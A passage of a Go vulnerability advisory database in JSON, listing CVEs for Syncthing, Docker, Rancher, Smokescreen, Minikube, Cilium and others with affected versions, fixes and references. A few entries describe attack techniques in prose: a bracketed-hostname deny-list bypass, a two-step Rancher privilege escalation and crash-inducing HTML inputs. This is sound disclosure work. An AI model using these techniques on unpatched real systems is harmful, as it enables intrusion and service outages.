[{"introduced": "0"}, {"fixed": "0.0.0-20190813141303-74dc4d7220e7"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-9512"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2594"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2661"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2682"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2690"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2726"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2766"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2769"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2796"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2861"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2925"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2939"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2955"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:2966"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3131"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3245"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3265"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3892"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:3906"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4018"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4019"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4020"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4021"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4040"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4041"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4042"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4045"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4269"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4273"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:4352"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0406"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0727"}, {"type": "WEB", "url": "https://github.com/Netflix/security-bulletins/blob/master/advisories/third-party/2019-002.md"}, {"type": "WEB", "url": "https://go.dev/cl/190137"}, {"type": "WEB", "url": "https://go.dev/issue/33606"}, {"type": "WEB", "url": "https://go.googlesource.com/go/+/145e193131eb486077b66009beb051aba07c52a5"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/65QixT3tcmg/m/DrFiG6vvCwAJ"}, {"type": "WEB", "url": "https://kb.cert.org/vuls/id/605641/"}, {"type": "WEB", "url": "https://kc.mcafee.com/corporate/index?page=content&id=SB10296"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/392108390cef48af647a2e47b7fd5380e050e35ae8d1aa2030254c04@%3Cusers.trafficserver.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/ad3d01e767199c1aed8033bb6b3f5bf98c011c7c536f07a5d34b3c19@%3Cannounce.trafficserver.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/bde52309316ae798186d783a5e29f4ad1527f61c9219a289d0eee0a7@%3Cdev.trafficserver.apache.org%3E"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2020/12/msg00011.html"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4BBP27PZGSY6OP6D26E5FW4GZKBFHNU7/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4ZQGHE3WTYLYAYJEIDJVF2FIGQTAYPMC/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/CMNFX5MNYRWWIMO4BTKYQCGUDMHO3AXP/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LYO6E3H34C346D2E443GLXK7OK6KIYIQ/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0536"}, {"type": "WEB", "url": "https://seclists.org/bugtraq/2019/Aug/24"}, {"type": "WEB", "url": "https://seclists.org/bugtraq/2019/Aug/31"}, {"type": "WEB", "url": "https://seclists.org/bugtraq/2019/Aug/43"}, {"type": "WEB", "url": "https://seclists.org/bugtraq/2019/Sep/18"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20190823-0001/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20190823-0004/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20190823-0005/"}, {"type": "WEB", "url": "https://support.f5.com/csp/article/K98053339"}, {"type": "WEB", "url": "https://support.f5.com/csp/article/K98053339?utm_source=f5support&amp;utm_medium=RSS"}, {"type": "WEB", "url": "https://usn.ubuntu.com/4308-1/"}, {"type": "WEB", "url": "https://www.debian.org/security/2019/dsa-4503"}, {"type": "WEB", "url": "https://www.debian.org/security/2019/dsa-4508"}, {"type": "WEB", "url": "https://www.debian.org/security/2019/dsa-4520"}, {"type": "WEB", "url": "https://www.synology.com/security/advisory/Synology_SA_19_33"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-08/msg00076.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00002.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00011.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00021.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00031.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00032.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00038.html"}, {"type": "WEB", "url": "http://seclists.org/fulldisclosure/2019/Aug/16"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2019/08/20/1"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:30:13Z", "nvd_published_at": "2019-08-13T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-28xp-g7f6-7mhf", "modified": "2023-10-10T16:33:31Z", "published": "2022-05-14T03:49:59Z", "aliases": ["CVE-2017-1000420"], "summary": "Syncthing vulnerable to symlink traversal and arbitrary file overwrite", "details": "Syncthing version 0.14.33 and older erronously versions symlinks when they are deleted. If a directory is then created with the same name, a file created in that directory, and the file deleted, it is moved into the symlink target. This can lead to symlink traversal resulting in arbitrary file overwrite.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/syncthing/syncthing"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.14.33"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-1000420"}, {"type": "WEB", "url": "https://github.com/syncthing/syncthing/issues/4286"}, {"type": "WEB", "url": "https://github.com/syncthing/syncthing/commit/f1f21bf22020d9b881478c2e942ba6943c8da2f3"}, {"type": "PACKAGE", "url": "https://github.com/syncthing/syncthing"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-26T22:17:40Z", "nvd_published_at": "2018-01-02T19:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2w2v-xcr9-mj4m", "modified": "2023-09-25T19:30:06Z", "published": "2022-05-24T16:53:08Z", "aliases": ["CVE-2019-12618"], "summary": "Hashicorp Nomad Access Control Issues", "details": "HashiCorp Nomad 0.9.0 through 0.9.1 has Incorrect Access Control via the exec driver.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.9.0"}, {"fixed": "0.9.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.1"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-12618"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/issues/5783"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/nomad"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/category/nomad"}, {"type": "WEB", "url": "https://www.hashicorp.com/blog/hashicorp-nomad-0-9-2"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-07-14T23:37:50Z", "nvd_published_at": "2019-08-12T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j249-ghv5-7mxv", "modified": "2023-08-15T20:17:38Z", "published": "2022-05-24T16:50:40Z", "aliases": ["CVE-2019-13509"], "summary": "Secret insertion into debug log in Docker", "details": "In Docker CE and EE before 18.09.8 (as well as Docker EE before 17.06.2-ee-23 and 18.x before 18.03.1-ee-10), Docker Engine in debug mode may sometimes add secrets to the debug log. This applies to a scenario where docker stack deploy is run to redeploy a stack that includes (non external) secrets. It potentially applies to other API users of the stack API if they resend the secret.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "18.09.8"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-13509"}, {"type": "WEB", "url": "https://docs.docker.com/engine/release-notes/18.09/"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-15T20:17:38Z", "nvd_published_at": "2019-07-18T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vj95-2f9q-x7h6", "modified": "2023-07-19T23:40:28Z", "published": "2022-05-24T16:48:34Z", "aliases": ["CVE-2018-15747"], "summary": "glot-code-runner RCE", "details": "The default configuration of glot-www through 2018-05-19 allows remote attackers to execute arbitrary code because glot-code-runner supports os.system within a \"python\" \"files\" \"content\" JSON file.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/prasmussen/glot-code-runner"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "2018-05-19"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-15747"}, {"type": "WEB", "url": "https://github.com/prasmussen/glot-code-runner/issues/15"}, {"type": "PACKAGE", "url": "https://github.com/prasmussen/glot-code-runner"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-07-19T23:40:28Z", "nvd_published_at": "2019-06-21T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vfxc-r2gx-v2vq", "modified": "2023-09-29T16:02:16Z", "published": "2022-05-24T16:46:55Z", "aliases": ["CVE-2019-12496"], "summary": "Hybrid Group Gobot Improper Certificate Validation vulnerability", "details": "An issue was discovered in Hybrid Group Gobot before 1.13.0. The mqtt subsystem skips verification of root CA certificates by default.\n\n### Specific Go Packages Affected\ngithub.com/hybridgroup/gobot/platforms/mqtt", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hybridgroup/gobot"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.12.1-0.20190521122906-c1aa4f867846"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-12496"}, {"type": "WEB", "url": "https://github.com/hybridgroup/gobot/commit/c1aa4f867846da4669ecf3bc3318bd96b7ee6f3f"}, {"type": "PACKAGE", "url": "https://github.com/hybridgroup/gobot"}, {"type": "WEB", "url": "https://github.com/hybridgroup/gobot/compare/ed53198...7f973df"}, {"type": "WEB", "url": "https://github.com/hybridgroup/gobot/releases/tag/v1.13.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0083"}], "database_specific": {"cwe_ids": ["CWE-295"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:25:02Z", "nvd_published_at": "2019-05-31T11:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qwrf-gfpj-qvj6", "modified": "2022-06-08T16:30:51Z", "published": "2022-05-24T22:04:04Z", "aliases": ["CVE-2022-29188"], "summary": "Smokescreen SSRF via deny list bypass (square brackets)", "details": "### Impact\nThe primary use case for Smokescreen is to prevent server-side request forgery (SSRF) attacks in which external attackers leverage the behavior of applications to connect to or scan internal infrastructure.\n\nSmokescreen also offers an option to deny access to additional (e.g., external) URLs by way of a deny list. There was an issue in Smokescreen that made it possible to bypass the deny list feature by surrounding the hostname with square brackets (e.g. `[example.com]`). \n\n### Recommendation\nUpgrade Smokescreen to version 0.0.4 or later.\n\n### Acknowledgements\nThanks to [Axel Chong](https://github.com/haxatron) for reporting the issue.\n\n### For more information\nEmail us at security@stripe.com\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/stripe/smokescreen"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/stripe/smokescreen/security/advisories/GHSA-qwrf-gfpj-qvj6"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29188"}, {"type": "WEB", "url": "https://github.com/stripe/smokescreen/commit/dea7b3c89df000f4072ff9866d61d78e30df6a36"}, {"type": "PACKAGE", "url": "github.com/stripe/smokescreen"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-05-24T22:04:04Z", "nvd_published_at": "2022-05-21T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x7f3-62pm-9p38", "modified": "2022-05-31T23:27:52Z", "published": "2022-05-20T00:00:26Z", "aliases": ["CVE-2022-28946"], "summary": "Out of bounds memory access in github.com/open-policy-agent/opa", "details": "An issue in the component ast/parser.go of Open Policy Agent v0.39.0 causes the application to incorrectly interpret every expression, causing a Denial of Service (DoS) via triggering out-of-range memory access.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/open-policy-agent/opa"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.40.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-28946"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/pull/4548"}, {"type": "WEB", "url": "https://github.com/open-policy-agent/opa/commit/e9d3828db670cbe11129885f37f08cbf04935264"}, {"type": "PACKAGE", "url": "https://github.com/open-policy-agent/opa"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0587"}], "database_specific": {"cwe_ids": ["CWE-119"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-25T20:20:13Z", "nvd_published_at": "2022-05-19T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jwvr-vv7p-gpwq", "modified": "2022-05-02T19:39:35Z", "published": "2022-05-02T19:39:35Z", "aliases": ["CVE-2021-36784"], "summary": "Privilege escalation for users with create/update permissions in Global Roles in Rancher", "details": "### Impact\nThis vulnerability affects customers who utilize non-admin users that are able to create or edit [Global Roles](https://rancher.com/docs/rancher/v2.6/en/admin-settings/rbac/). The most common use case for this scenario is the [`restricted-admin`](https://rancher.com/docs/rancher/v2.6/en/admin-settings/rbac/global-permissions/#restricted-admin) role.\n\nA flaw was discovered in Rancher versions from 2.5.0 up to and including 2.5.12 and from 2.6.0 up to and including 2.6.3 which allows users who have create or update permissions on Global Roles to escalate their permissions, or those of another user, to admin-level permissions. Global Roles grant users Rancher-wide permissions, such as the ability to create clusters. In the identified versions of Rancher, when users are given permission to edit or create Global Roles, they are not restricted to only granting permissions which they already posses.\n\nThe privilege escalation can be taken advantage of in two ways by users with create or update permissions on Global Roles (including the `restricted-admin`):\n\n1. Editing the global `admin` role to make it the default for new users, then creating a new user that will be elevated to the global `admin` role.\n2. Creating a new global role with permissions already possessed by the `restricted-admin`, assigning this new role to a user, then modifying the global role to grant additional administrive like permissions (`'*'`) to the elevated user.\n\n### Patches\nPatched versions include releases 2.5.13, 2.6.4 and later versions.\n\n### Workarounds\nLimit access in Rancher to trusted users. There is not a direct mitigation besides upgrading to the patched Rancher versions.\n\n**Note:** If you have users who have create or edit permissions on Global Roles but are not admin users (for example, the `restricted-admin`), it is highly advised to review the roles and users created by those users for possible privilege escalations.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.13"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-jwvr-vv7p-gpwq"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-36784"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=1193991"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/releases/tag/v2.5.13"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/releases/tag/v2.6.4"}, {"type": "PACKAGE", "url": "github.com/rancher/rancher"}], "database_specific": {"cwe_ids": ["CWE-269", "CWE-285"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-05-02T19:39:35Z", "nvd_published_at": "2022-05-02T12:16:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6pcv-qqx4-mxm3", "modified": "2023-07-21T21:47:33Z", "published": "2022-05-13T01:35:04Z", "aliases": ["CVE-2018-1002103"], "summary": "Minikube RCE via DNS Rebinding", "details": "In Minikube versions 0.3.0-0.29.0, minikube exposes the Kubernetes Dashboard listening on the VM IP at port 30000. In VM environments where the IP is easy to predict, the attacker can use DNS rebinding to indirectly make requests to the Kubernetes Dashboard, create a new Kubernetes Deployment running arbitrary code. If minikube mount is in use, the attacker could also directly access the host filesystem.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/minikube"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.3.0"}, {"last_affected": "0.29.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1002103"}, {"type": "WEB", "url": "https://github.com/kubernetes/minikube/issues/3208"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-21T21:47:33Z", "nvd_published_at": "2018-12-05T21:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fmrf-gvjp-5j5g", "modified": "2022-06-06T17:57:44Z", "published": "2022-05-24T21:15:15Z", "aliases": ["CVE-2022-29179"], "summary": "Improper Privilege Management in Cilium", "details": "### Impact\n\nIf an attacker is able to perform a container escape of a container running as root on a host where Cilium is installed, the attacker can leverage Cilium's Kubernetes service account to gain access to cluster privileges that are more permissive than what is minimally required to operate Cilium. In affected releases, this service account had access to modify and delete `Pod` and `Node` resources. \n\n### Patches\n\nThe problem has been fixed and is available on versions >=1.9.16, >=1.10.11, >=1.11.5\n\n### Workarounds\n\nThere are no workarounds available.\n\n### Acknowledgements\n\nThe Cilium community has worked together with members of Isovalent, Amazon and Palo Alto Networks to prepare these mitigations.  Special thanks to Micah Hausler (AWS), Robert Clark (AWS), Yuval Avrahami (Palo Alto Networks), and Shaul Ben Hai (Palo Alto Networks) for their cooperation.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\nEmail us at [security@cilium.io](mailto:security@cilium.io)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.16"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium/security/advisories/GHSA-fmrf-gvjp-5j5g"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29179"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.10.11"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.11.5"}, {"type": "WEB", "url": "https://github.com/cilium/cilium/releases/tag/v1.9.16"}, {"type": "PACKAGE", "url": "github.com/cilium/cilium"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-24T21:15:15Z", "nvd_published_at": "2022-05-20T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5p4h-3377-7w67", "modified": "2023-02-08T00:38:17Z", "published": "2022-05-13T01:19:22Z", "aliases": ["CVE-2018-17075"], "summary": "golang.org/x/net/html NULL Pointer Dereference vulnerability", "details": "The html package (aka x/net/html) before 2018-07-13 in Go mishandles \"in frameset\" insertion mode, leading to a \"panic: runtime error\" for html.Parse of <template><object>, <template><applet>, or <template><marquee>. This is related to HTMLTreeBuilder.cpp in WebKit.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20180816102801-aaf60122140d"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-17075"}, {"type": "WEB", "url": "https://github.com/golang/go/issues/27016"}, {"type": "WEB", "url": "https://github.com/golang/net/commit/aaf60122140d3fcf75376d319f0554393160eb50"}, {"type": "WEB", "url": "https://bugs.chromium.org/p/chromium/issues/detail?id=829668"}, {"type": "PACKAGE", "url": "https://github.com/golang/go"}, {"type": "WEB", "url": "https://go-review.googlesource.com/c/net/+/94838/9/html/parse.go#1906"}, {"type": "WEB", "url": "https://go.dev/cl/123776"}, {"type": "WEB", "url": "https://go.dev/issue/27016"}, {"type": "WEB", "url": "https://go.googlesource.com/net/+/aaf60122140d3fcf75376d319f0554393160eb50"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LREEWY6KNLHRWFZ7OT4HVLMVVCGGUHON/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UKRCI7WIOCOCD3H7NXWRGIRABTQOZOBK/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0078"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:38:17Z", "nvd_published_at": "2018-09-16T02:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9hxg-w7qf-hh93", "modified": "2023-10-06T15:41:46Z", "published": "2022-05-14T01:37:52Z", "aliases": ["CVE-2018-20303"], "summary": "Gogs Directory Traversal", "details": "In pkg/tool/path.go in Gogs before 0.11.82.1218, a directory traversal in the file-upload functionality can allow an attacker to create a file under data/sessions on the server, a similar issue to CVE-2018-18925.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.11.82.1218"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-20303"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/issues/5558"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://pentesterlab.com/exercises/cve-2018-18925/"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-25T18:09:57Z", "nvd_published_at": "2018-12-20T00:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9c9w-9pq7-f35h", "modified": "2023-07-20T15:01:40Z", "published": "2022-05-24T17:32:32Z", "aliases": ["CVE-2020-24710"], "summary": "Gophish vulnerable to Server-Side Request Forgery", "details": "Gophish before 0.11.0 allows SSRF attacks.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gophish/gophish"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.11.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-24710"}, {"type": "WEB", "url": "https://github.com/gophish/gophish/commit/e3352f481e94054ffe08494c9225d3878347b005"}, {"type": "PACKAGE", "url": "https://github.com/gophish/gophish"}, {"type": "WEB", "url": "https://github.com/gophish/gophish/releases/tag/v0.11.0"}, {"type": "WEB", "url": "https://herolab.usd.de/security-advisories/usd-2020-0054/"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-20T15:01:40Z", "nvd_published_at": "2020-10-28T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9wm7-rc47-g56m", "modified": "2023-07-12T20:41:56Z", "published": "2022-05-24T17:37:26Z", "aliases": ["CVE-2020-29243"], "summary": "dhowden tag panic due to out-of-bounds read", "details": "Due to improper bounds checking, a number of methods in dhowden tag before 0.0.0-20201120070457-d52dcb253c63 can trigger a panic via `readAPICFrame` due to attempted out-of-bounds reads. If the package is used to parse user supplied input, this may be used as a vector for a denial of service attack.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dhowden/tag"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20201120070457-d52dcb253c63"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-29243"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/issues/80"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/4b595ed4fac79f467594aa92f8953f90f817116e"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/6b18201aa5c5535511802ddfb4e4117686b4866d"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/a92213460e4838490ce3066ef11dc823cdc1740e"}, {"type": "WEB", "url": "https://github.com/dhowden/tag/commit/d52dcb253c63a153632bfee5f269dd411dcd8e96"}, {"type": "PACKAGE", "url": "https://github.com/dhowden/tag"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0097"}], "database_specific": {"cwe_ids": ["CWE-129"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-07T22:41:02Z", "nvd_published_at": 